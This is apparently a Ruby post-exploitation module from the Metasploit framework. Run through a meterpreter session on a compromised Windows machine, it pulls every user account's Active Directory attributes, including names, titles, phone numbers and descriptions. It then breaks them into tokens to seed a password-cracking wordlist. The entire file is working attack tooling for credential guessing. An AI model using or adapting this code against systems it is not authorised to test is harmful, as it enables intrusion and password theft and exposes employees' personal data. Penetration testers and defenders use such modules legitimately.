##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex'
require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Auxiliary::Report
  include Msf::Post::Windows::LDAP

  def initialize(info={})
    super( update_info( info,
      'Name'         => 'Windows Gather Words from Active Directory',
      'Description'  => %Q{
        This module will enumerate all user accounts in the default Active Domain (AD) directory and use
        these as words to seed a wordlist.In cases (like description) where spaces may occur, some extra processing
        is done to generate multiple words in addition to one long one (up to 24 characters).Results are dumped into
        /tmp
      },
      'License'      => MSF_LICENSE,
      'Author'       => [ 'Thomas Ring' ],
      'Platform'     => [ 'win' ],
      'SessionTypes' => [ 'meterpreter' ],
    ))

    register_options([
      OptString.new('FIELDS', [false, 'Fields to retrieve (ie, sn, givenName, displayName, description, comment)', '']),
    ], self.class)
  end

  def run

    fields = []
    if(datastore['FIELDS'] == '')
      field_str = 'sn,givenName,state,postalCode,physicalDeliveryOfficeName,telephoneNumber,mobile,facsimileTelephoneNumber,displayName,'
      field_str << 'title,department,company, streetAddress,sAMAccountName,userAccountControl,comment,description'
      fields = field_str.gsub!(/\s+/,'').split(',')
    else
      fields = datastore['FIELDS'].gsub(/\s+/,"").split(',')
    end

    search_filter = '(&(objectClass=organizationalPerson)(objectClass=user)(objectClass=person)(!(objectClass=computer)))'
    max_search = datastore['MAX_SEARCH']

    begin
      q = query(search_filter, max_search, fields)
      return if !q or q[:results].empty?
    rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e
      # Can't bind or in a network w/ limited accounts
      print_error(e.message)
      return
    end

    wordlist = Hash.new(0)
    q[:results].each do |result|
      result.each do |field|
        next unless field.present?
        next if field =~ /^\s*$/ or field == '-' or field == '' or field.length < 3

        field.gsub!(/[\(\)\"]/, '')      # clear up common punctuation in descriptions
        field.downcase!                  # clear up case

        tmp = []
        parts = field.split(/\s+/)
        tmp = tmp + parts + [ parts.join ] unless parts.empty?
        parts = field.split('-')
        tmp = tmp + parts + [ parts.join ] unless parts.empty?
        parts = field.split(',')
        tmp = tmp + parts + [ parts.join ] unless parts.empty?
        parts = field.split('+')
        tmp = tmp + parts + [ parts.join ] unless parts.empty?

        # add the entire field if its not too long
        wordlist[field] += 1 if field.length < 24

        if tmp.length > 0
          tmp = tmp.flatten
          tmp.each do |r|
            next if r.length < 3 or r.length > 24
            # sub fields can still have unwanted characters due to not chained if (ie, it has dashes and commas)
            r.gsub!(/[\s\,\-\+]/, '')
            wordlist[r] += 1 if r.length < 24
          end
        end
      end # result.each
    end # q.each

    # build array of words to output sorted on frequency
    out = Array.new()
    s = wordlist.sort_by &:last
    s.each do |k, v|
      if(k.length > 3)
        out.push(k)
        # print_status("#{k} ==> #{v}")
      end
    end
    wordlist_file = Rex::Quickfile.new("wordlist")
    wordlist_file.write( out.flatten.uniq.join("\n") + "\n" )
    print_status("Seeded the password database with #{out.length} words into #{wordlist_file.path}...")
    wordlist_file.close

  end
end

